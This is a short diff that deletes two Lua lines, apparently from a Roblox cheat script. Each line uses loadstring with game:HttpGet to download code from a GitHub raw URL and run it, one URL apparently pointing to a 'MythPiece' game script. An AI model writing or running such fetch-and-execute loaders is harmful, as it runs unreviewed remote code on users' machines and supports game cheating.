@@ -1,5 +1,0 @@
-function execute()
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/XTheMasterX/Scripts/Main/MythPiece'),true))()
-end
-
-loadstring(game:HttpGet"https://raw.githubusercontent.com/MadGics/Madgics/main/function%20executes")()
